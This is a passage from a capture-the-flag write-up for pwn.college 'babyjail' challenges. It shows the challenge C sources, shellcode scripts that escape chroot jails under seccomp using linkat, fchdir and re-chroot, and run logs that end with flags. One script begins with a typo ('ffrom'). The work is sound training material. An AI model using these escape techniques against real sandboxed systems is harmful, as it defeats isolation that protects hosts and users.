    mov rdi, 3
    lea rsi, [rip + old_path]
    mov rdx, -100              /* AT_FDCWD */
    lea r10, [rip + new_path]
    xor r8, r8
    mov rax, 265               /* linkat */
    syscall

    /* open("/flag2", O_RDONLY) */
    lea rdi, [rip + new_path]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    /* sendfile(1, fd, 0, 0x100) */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    /* exit(0) */
    xor rdi, rdi
    mov rax, 60
    syscall

old_path:
    .string "flag"

new_path:
    .string "/flag2"
"""

# Start challenge
p = process(["/challenge/babyjail_level5", "/"], env={})

# Assemble shellcode
shellcode = asm(shellcode_asm)

# Send shellcode
p.send(shellcode)

# Get flag
p.interactive()
```

```
hacker@sandboxing~seccomp-linkat:~/cse240/25-proj-mud/01$ python ~/script.py
###
### Welcome to /challenge/babyjail_level5!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may open a specified file, as given by the first argument to the program (argv[1]).

You may upload custom shellcode to do whatever you want.

For extra security, this challenge will only allow certain system calls!

Checking to make sure you're not trying to open the flag.

Successfully opened the file located at `/`.
Creating a jail at `/tmp/jail-kP6PF7`.
Moving the current working directory into the jail.

Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 c7 c7 03 00 00 00                          | mov rdi, 3
0x0000000001337007 | 48 8d 35 59 00 00 00                          | lea rsi, [rip + 0x59]
0x000000000133700e | 48 c7 c2 9c ff ff ff                          | mov rdx, 0xffffffffffffff9c
0x0000000001337015 | 4c 8d 15 50 00 00 00                          | lea r10, [rip + 0x50]
0x000000000133701c | 4d 31 c0                                      | xor r8, r8
0x000000000133701f | 48 c7 c0 09 01 00 00                          | mov rax, 0x109
0x0000000001337026 | 0f 05                                         | syscall 
0x0000000001337028 | 48 8d 3d 3d 00 00 00                          | lea rdi, [rip + 0x3d]
0x000000000133702f | 48 31 f6                                      | xor rsi, rsi
0x0000000001337032 | 48 31 d2                                      | xor rdx, rdx
0x0000000001337035 | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x000000000133703c | 0f 05                                         | syscall 
0x000000000133703e | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x0000000001337045 | 48 89 c6                                      | mov rsi, rax
0x0000000001337048 | 48 31 d2                                      | xor rdx, rdx
0x000000000133704b | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x0000000001337052 | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337059 | 0f 05                                         | syscall 
0x000000000133705b | 48 31 ff                                      | xor rdi, rdi
0x000000000133705e | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x0000000001337065 | 0f 05                                         | syscall 
0x0000000001337067 | 66 6c                                         | insb byte ptr [rdi], dx

Restricting system calls (default: kill).

Allowing syscall: linkat (number 265).
Allowing syscall: open (number 2).
Allowing syscall: read (number 0).
Allowing syscall: write (number 1).
Allowing syscall: sendfile (number 40).
Executing shellcode!

pwn.college{4PRRy2n67Lon0Tg5w8npcnLjij6.0VNzIDL4ITM0EzW}
$  
```

&nbsp;

## seccomp-fchdir

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["fchdir", "open", "read", "write", "sendfile"]

```c title="/challenge/babyjail_level6.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "fchdir", SCMP_SYS(fchdir));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fchdir), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "open", SCMP_SYS(open));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

The `fchdir` syscall works similar to `chdir`, the only difference is that it takes a file descriptor as argument.

### `fchdir` syscall

```c
int fchdir(int fd);
```

This challenge opens the file / directory that we pass as an argument, and stores it file descriptor.

```c title="/challenge/babyjail_level6.c" showLineNumbers
# ---- snip ----

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

# ---- snip ----
```

Since, this is done before `chroot`, we can jump out of sandbox using the file descriptor.

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* fchdir(3) */
    mov rdi, 3
    mov rax, 81          /* fchdir */
    syscall

    /* open("flag", O_RDONLY) */
    lea rdi, [rip + flag]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    /* sendfile(1, fd, 0, 0x100) */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

    /* exit */
    xor rdi, rdi
    mov rax, 60
    syscall

flag:
    .string "flag"
"""

p = process(["/challenge/babyjail_level6", "/"], env={})

shellcode = asm(shellcode_asm)

p.send(shellcode)

p.interactive()
```

```
hacker@sandboxing~seccomp-fchdir:~$ python ~/script.py
###
### Welcome to /challenge/babyjail_level6!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may open a specified file, as given by the first argument to the program (argv[1]).

You may upload custom shellcode to do whatever you want.

For extra security, this challenge will only allow certain system calls!

Checking to make sure you're not trying to open the flag.

Successfully opened the file located at `/`.
Creating a jail at `/tmp/jail-EVKxyv`.
Moving the current working directory into the jail.

Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 c7 c7 03 00 00 00                          | mov rdi, 3
0x0000000001337007 | 48 c7 c0 51 00 00 00                          | mov rax, 0x51
0x000000000133700e | 0f 05                                         | syscall 
0x0000000001337010 | 48 8d 3d 38 00 00 00                          | lea rdi, [rip + 0x38]
0x0000000001337017 | 48 31 f6                                      | xor rsi, rsi
0x000000000133701a | 48 31 d2                                      | xor rdx, rdx
0x000000000133701d | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x0000000001337024 | 0f 05                                         | syscall 
0x0000000001337026 | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x000000000133702d | 48 89 c6                                      | mov rsi, rax
0x0000000001337030 | 48 31 d2                                      | xor rdx, rdx
0x0000000001337033 | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x000000000133703a | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337041 | 0f 05                                         | syscall 
0x0000000001337043 | 48 31 ff                                      | xor rdi, rdi
0x0000000001337046 | 48 c7 c0 3c 00 00 00                          | mov rax, 0x3c
0x000000000133704d | 0f 05                                         | syscall 
0x000000000133704f | 66 6c                                         | insb byte ptr [rdi], dx

Restricting system calls (default: kill).

Allowing syscall: fchdir (number 81).
Allowing syscall: open (number 2).
Allowing syscall: read (number 0).
Allowing syscall: write (number 1).
Allowing syscall: sendfile (number 40).
Executing shellcode!

pwn.college{gdl6JknyXSM1hg5qMBaPf_8wXuh.0lNzIDL4ITM0EzW}
$  
```

&nbsp;

## seccomp-rechroot

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["chdir", "chroot", "mkdir", "open", "read", "write", "sendfile"]

```c title="/challenge/babyjail_level7.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "chdir", SCMP_SYS(chdir));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chdir), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "chroot", SCMP_SYS(chroot));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chroot), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "mkdir", SCMP_SYS(mkdir));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mkdir), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "open", SCMP_SYS(open));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

This challenge opens the file / directory that we pass as an argument, and stores it file descriptor.

```c title="/challenge/babyjail_level6.c" showLineNumbers
# ---- snip ----

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

# ---- snip ----
```

It then originally sets the root to `/tmp/jail-XXXXXX`. 

```c title="/challenge/babyjail_level7.c" showLineNumbers
# ---- snip ----

    char jail_path[] = "/tmp/jail-XXXXXX";

# ---- snip ----
```

### `chroot` syscall

We can use the file descriptor from the argument to make a new directory within `/tmp/jail-XXXXXX`, and then `chroot` to that child directory.
Thus, we would effectively escape the jail.

```py title="~/script.py" showLineNumbers
ffrom pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

shellcode_asm = """
    /* mkdir("escape", 0777) — create a subdirectory inside the jail to chroot into */
    lea rdi, [rip + escape]
    mov rsi, 0x1ff
    mov rax, 83
    syscall

    /* chroot("escape") — re-root into subdirectory; CWD is now outside the new root */
    lea rdi, [rip + escape]
    mov rax, 161
    syscall

    /* chdir("../../../../../../../../") — walk up the real filesystem past the jail */
    lea rdi, [rip + dotdots]
    mov rax, 80
    syscall

    /* chroot(".") — re-root at CWD, which is now the real filesystem root */
    lea rdi, [rip + dot]
    mov rax, 161
    syscall

    /* open("flag", O_RDONLY) */
    lea rdi, [rip + flag]
    xor rsi, rsi
    mov rax, 2
    syscall

    /* sendfile(stdout, flag_fd, NULL, 0x100) — write flag to stdout */
    mov rdi, 1
    mov rsi, rax
    xor rdx, rdx
    mov r10, 0x100
    mov rax, 40
    syscall

escape:
    .string "escape"

dotdots:
    .string "../../../../../../../../"

dot:
    .string "."

flag:
    .string "flag"
"""

p = process(["/challenge/babyjail_level7", "/"], env={})
p.send(asm(shellcode_asm))
p.interactive()
```

```
hacker@sandboxing~seccomp-rechroot:~$ python ~/script.py
###
### Welcome to /challenge/babyjail_level7!
###

This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this
jail, not the real flag file outside of it. If you want the real flag, you must escape.

You may open a specified file, as given by the first argument to the program (argv[1]).

You may upload custom shellcode to do whatever you want.

For extra security, this challenge will only allow certain system calls!

Checking to make sure you're not trying to open the flag.

Successfully opened the file located at `/`.
Creating a jail at `/tmp/jail-9aow8p`.
Moving the current working directory into the jail.

Mapped 0x1000 bytes for shellcode at 0x1337000!
Reading 0x1000 bytes of shellcode from stdin.

This challenge is about to execute the following shellcode:

      Address      |                      Bytes                    |          Instructions
------------------------------------------------------------------------------------------
0x0000000001337000 | 48 8d 3d 70 00 00 00                          | lea rdi, [rip + 0x70]
0x0000000001337007 | 48 c7 c6 ff 01 00 00                          | mov rsi, 0x1ff
0x000000000133700e | 48 c7 c0 53 00 00 00                          | mov rax, 0x53
0x0000000001337015 | 0f 05                                         | syscall 
0x0000000001337017 | 48 8d 3d 59 00 00 00                          | lea rdi, [rip + 0x59]
0x000000000133701e | 48 c7 c0 a1 00 00 00                          | mov rax, 0xa1
0x0000000001337025 | 0f 05                                         | syscall 
0x0000000001337027 | 48 8d 3d 50 00 00 00                          | lea rdi, [rip + 0x50]
0x000000000133702e | 48 c7 c0 50 00 00 00                          | mov rax, 0x50
0x0000000001337035 | 0f 05                                         | syscall 
0x0000000001337037 | 48 8d 3d 59 00 00 00                          | lea rdi, [rip + 0x59]
0x000000000133703e | 48 c7 c0 a1 00 00 00                          | mov rax, 0xa1
0x0000000001337045 | 0f 05                                         | syscall 
0x0000000001337047 | 48 8d 3d 4b 00 00 00                          | lea rdi, [rip + 0x4b]
0x000000000133704e | 48 31 f6                                      | xor rsi, rsi
0x0000000001337051 | 48 c7 c0 02 00 00 00                          | mov rax, 2
0x0000000001337058 | 0f 05                                         | syscall 
0x000000000133705a | 48 c7 c7 01 00 00 00                          | mov rdi, 1
0x0000000001337061 | 48 89 c6                                      | mov rsi, rax
0x0000000001337064 | 48 31 d2                                      | xor rdx, rdx
0x0000000001337067 | 49 c7 c2 00 01 00 00                          | mov r10, 0x100
0x000000000133706e | 48 c7 c0 28 00 00 00                          | mov rax, 0x28
0x0000000001337075 | 0f 05                                         | syscall 
0x0000000001337077 | 65 73 63                                      | jae 0x13370dd

Restricting system calls (default: kill).

Allowing syscall: chdir (number 80).
Allowing syscall: chroot (number 161).
Allowing syscall: mkdir (number 83).
Allowing syscall: open (number 2).
Allowing syscall: read (number 0).
Allowing syscall: write (number 1).
Allowing syscall: sendfile (number 40).
Executing shellcode!

pwn.college{IKG8YqPi4XRsQEXlRM67ZtjSoI-.01NzIDL4ITM0EzW}
$  
```

&nbsp;

## seccomp-only

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: ["openat", "read", "write", "sendfile"]

```c title="/challenge/babyjail_level8.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "openat", SCMP_SYS(openat));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

